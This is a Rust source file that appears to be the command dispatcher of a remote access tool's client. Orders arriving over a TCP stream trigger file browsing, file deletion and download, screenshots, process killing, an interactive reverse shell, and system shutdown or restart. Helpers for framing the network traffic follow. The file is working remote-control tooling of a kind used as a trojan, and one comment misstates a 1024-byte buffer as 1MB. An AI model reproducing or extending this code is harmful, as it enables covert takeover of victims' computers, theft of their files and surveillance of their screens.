use std::io::{Read, Write};
use std::sync::{Arc, Mutex};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;

use crate::features::reverse_shell::{start_shell, exit_shell, execute_shell_command};
use crate::features::file_manager::file_manager;
use crate::features::system_commands::system_commands;
use crate::features::other::{take_screenshot, client_info};
use crate::features::process::{process_list, kill_process};

pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
    match command {
        cmd 
        if cmd.starts_with("view_dir||") || cmd.starts_with("remove_dir||") || cmd.starts_with("remove_file||") || cmd.starts_with("download_file||") => {
            file_manager(write_stream, current_path, cmd);
        },
        "available_disks" | "previous_dir" => {
            file_manager(write_stream, current_path, command);
        },
        "init_client" => client_info(write_stream),
        _ if command.starts_with("take_screenshot") => {
            let display = command["take_screenshot::".len()..].parse::<i32>().unwrap();
            take_screenshot(write_stream, display);
        },
        "process_list" => process_list(write_stream),
        _ if command.starts_with("kill_process") => {
            let pid = command["kill_process::".len()..].parse::<usize>().unwrap();
            kill_process(pid);
        },
        "start_shell" => {
            let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
            start_shell(shared_stream, remote_shell)
        },
        "exit_shell" => exit_shell(remote_shell),
        _ if command.starts_with("shell::") => execute_shell_command(remote_shell, &command["shell::".len()..]),
        "shutdown" | "logout" | "restart" => system_commands(command),
        _ => {}
    }
}

pub fn read_buffer_tcp(stream: &mut TcpStream) -> Result<Vec<u8>, ()> {
    let mut buffer = [0_u8; 1024 * 1024];
    let mut vect: Vec<u8> = Vec::new();
    match stream.read(&mut buffer) {
        Ok(size) => {
            let buf_str = String::from_utf8_lossy(&buffer[0..size]);

            if size == 0 {
                return Err(());
            }

            for v in &buffer[0..size] {
                vect.push(*v);
            }

            if !buf_str.ends_with("\n----------ENDOFCONTENT----------\n") {
                loop {
                    if let Ok(_size) = stream.read(&mut buffer) {
                        if _size == 0 {
                            return Err(());
                        }

                        for v in &buffer[0.._size] {
                            vect.push(*v);
                        }

                        if String::from_utf8_lossy(vect.as_slice())
                            .ends_with("\n----------ENDOFCONTENT----------\n")
                        {
                            vect = vect[0..(vect.len() - 34)].to_vec();
                            break;
                        }
                    } else {
                        return Err(());
                    }
                }
            } else {
                vect = vect[0..vect.len() - 34].to_vec();
            }
            Ok(vect)
        }
        Err(_) => Err(()),
    }
}

pub fn write_content(stream: &mut TcpStream, bytes: &[u8]) {
    let _ = stream.write(bytes);
}

pub fn write_bytes(stream: &mut TcpStream, bytes: &[u8]) {
    let mut vec = bytes.to_vec();
    "\n----------ENDOFCONTENT----------\n".as_bytes().iter().for_each(|b| vec.push(*b));
    let _ = stream.write(vec.as_slice());
}

pub fn read_buffer<I>(stream: &mut I) -> Result<Vec<u8>, ()>
    where I: Read {
    let mut buffer = [0_u8; 1024]; // 1MB Buffer
    match stream.read(&mut buffer) {
        Ok(size) => {
            if size == 0 {
                return Err(());
            }

            let mut vect: Vec<u8> = Vec::new();
            for v in &buffer[0..size] {
                vect.push(*v);
            }

            Ok(vect)
        },
        Err(_) => {
            Err(())
        }
    }
}